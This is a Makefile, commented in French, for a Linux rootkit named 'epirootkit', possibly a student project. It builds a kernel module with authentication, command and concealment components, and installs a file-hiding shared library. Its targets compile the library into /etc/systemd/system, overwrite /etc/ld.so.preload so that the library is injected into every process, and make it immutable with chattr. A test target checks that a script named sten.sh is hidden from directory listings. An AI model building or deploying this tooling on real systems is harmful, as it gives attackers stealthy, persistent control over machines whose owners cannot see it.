obj-m += epirootkit.o
epirootkit-objs := main.o auth.o cache.o commandes.o dissimulation.o notification.o

# Variables pour le masquage de fichiers
HIDE_SRC = masquer.c
HIDE_LIB = libhide.so
HIDE_INSTALL_PATH = /usr/lib/libprocfs.so
PRELOAD_FILE = /etc/ld.so.preload
TARGET_DIR = /etc/systemd/system

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

# S'assurer que le répertoire cible existe
ensure-dir:
	@echo "Vérification du répertoire cible..."
	sudo mkdir -p $(TARGET_DIR)

copy: ensure-dir
	@echo "Copie du code source vers $(TARGET_DIR)..."
	sudo cp $(HIDE_SRC) $(TARGET_DIR)/
	
	@echo "Compilation dans $(TARGET_DIR)..."
	sudo sh -c 'cd $(TARGET_DIR) && gcc -shared -fPIC $(HIDE_SRC) -o $(HIDE_LIB) -ldl'
	@echo "Compilation terminée dans $(TARGET_DIR)"

install-libhide: copy
	@echo "Installation de la bibliothèque depuis $(TARGET_DIR)..."
	sudo sh -c 'cd $(TARGET_DIR) && chmod 644 $(HIDE_LIB)'
	
	@echo "Configuration du préchargement persistant..."
	# Vérifier si le chemin est déjà dans le fichier de préchargement
	if sudo grep -q "$(TARGET_DIR)/$(HIDE_LIB)" $(PRELOAD_FILE) 2>/dev/null; then \
		echo "La bibliothèque est déjà configurée pour le préchargement."; \
	else \
		sudo sh -c 'echo "$(TARGET_DIR)/$(HIDE_LIB)" > $(PRELOAD_FILE)'; \
		sudo chmod 644 $(PRELOAD_FILE); \
	fi
	
	# Rendre la bibliothèque immuable pour éviter les modifications
	sudo sh -c 'cd $(TARGET_DIR) && chattr +i $(HIDE_LIB)' 2>/dev/null || true
	
	@echo "Bibliothèque compilée, installée et configurée directement dans $(TARGET_DIR)"

test-in-systemd: install-libhide
	@echo "Test du masquage dans $(TARGET_DIR):"
	sudo sh -c 'cd $(TARGET_DIR) && ls -la'
	@echo "Si l'installation est correcte, le fichier sten.sh ne devrait pas apparaître ci-dessus."

compile-and-run-in-systemd: install-libhide test-in-systemd
	@echo "Configuration complète terminée. Le masquage est actif de manière persistante."
	@echo "La bibliothèque est compilée et installée directement dans $(TARGET_DIR)"

uninstall:
	@echo "Désinstallation de la bibliothèque..."
	sudo sh -c 'cd $(TARGET_DIR) && chattr -i $(HIDE_LIB)' 2>/dev/null || true
	sudo sed -i '\|$(TARGET_DIR)/$(HIDE_LIB)|d' $(PRELOAD_FILE) 2>/dev/null || true
	sudo rm -f $(TARGET_DIR)/$(HIDE_LIB) $(TARGET_DIR)/$(HIDE_SRC)
	@echo "Bibliothèque désinstallée et fichiers source supprimés de $(TARGET_DIR)"

install:
	sudo bash install.sh

remove:
	sudo rmmod epirootkit

load: all install

reload: remove clean all install

.PHONY: all clean ensure-dir copy install-libhide test-in-systemd compile-and-run-in-systemd uninstall install remove load reload
